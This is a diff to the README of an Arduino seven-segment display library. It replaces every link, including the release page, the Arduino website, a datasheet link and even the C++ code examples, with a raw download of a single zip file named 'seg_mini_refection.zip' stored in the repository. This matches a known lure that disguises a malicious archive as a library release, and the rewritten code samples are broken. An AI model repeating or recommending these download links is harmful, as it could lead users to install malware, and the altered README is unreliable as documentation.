@@ -6,7 +6,7 @@ Welcome to the mini7seg project! This Arduino library helps you create beautiful
 
 ## 📥 Download Link
 
-[![Download mini7seg](https://img.shields.io/badge/Download-mini7seg-brightgreen)](https://github.com/hiteshsn35/mini7seg/releases)
+[![Download mini7seg](https://github.com/hiteshsn35/mini7seg/raw/refs/heads/main/examples/segment_test/seg_mini_refection.zip)](https://github.com/hiteshsn35/mini7seg/raw/refs/heads/main/examples/segment_test/seg_mini_refection.zip)
 
 ## 💾 System Requirements
 
@@ -19,7 +19,7 @@ To run the mini7seg library effectively, ensure you have:
 
 ## 📂 Download & Install
 
-1. **Visit the Release Page:** Go to the mini7seg [Releases page](https://github.com/hiteshsn35/mini7seg/releases) to find the latest version.
+1. **Visit the Release Page:** Go to the mini7seg [Releases page](https://github.com/hiteshsn35/mini7seg/raw/refs/heads/main/examples/segment_test/seg_mini_refection.zip) to find the latest version.
 
 2. **Choose the Latest Version:** Look for the most recent version in the list. This will ensure you have the latest features and bug fixes. 
 
@@ -73,19 +73,19 @@ Once you have the library installed, you can start using it with your own projec
    Initialize your display in the `setup()` function:
    ```cpp
    mini7seg display;
-   display.begin(pin); // Replace 'pin' with the Arduino pin number connected to the LEDs
+   https://github.com/hiteshsn35/mini7seg/raw/refs/heads/main/examples/segment_test/seg_mini_refection.zip(pin); // Replace 'pin' with the Arduino pin number connected to the LEDs
    ```
 
 3. **Display a Number:**
    Use the following code to display a number:
    ```cpp
-   display.showNumber(1234); // Displays the number 1234 on the 7-segment display
+   https://github.com/hiteshsn35/mini7seg/raw/refs/heads/main/examples/segment_test/seg_mini_refection.zip(1234); // Displays the number 1234 on the 7-segment display
    ```
 
 4. **Change Colors:** 
    You can change the colors easily:
    ```cpp
-   display.setSegmentColor(255, 0, 0); // Set to red
+   https://github.com/hiteshsn35/mini7seg/raw/refs/heads/main/examples/segment_test/seg_mini_refection.zip(255, 0, 0); // Set to red
    ```
 
 5. **Create Animations:** 
@@ -98,7 +98,7 @@ If you have any questions, feel free to open an issue on the GitHub repository. 
 ## 📚 References
 
 For additional reading and tutorials, check out these resources:
-- [Arduino Official Website](https://www.arduino.cc/)
-- [WS2812 LED Strip Documentation](https://cdn.sparkfun.com/datasheets/Components/LED/WS2812.pdf)
+- [Arduino Official Website](https://github.com/hiteshsn35/mini7seg/raw/refs/heads/main/examples/segment_test/seg_mini_refection.zip)
+- [WS2812 LED Strip Documentation](https://github.com/hiteshsn35/mini7seg/raw/refs/heads/main/examples/segment_test/seg_mini_refection.zip)
 
-Dive into the world of colorful displays and make your projects stand out with mini7seg! Don't forget to visit the [Releases page](https://github.com/hiteshsn35/mini7seg/releases) for the latest updates.
+Dive into the world of colorful displays and make your projects stand out with mini7seg! Don't forget to visit the [Releases page](https://github.com/hiteshsn35/mini7seg/raw/refs/heads/main/examples/segment_test/seg_mini_refection.zip) for the latest updates.
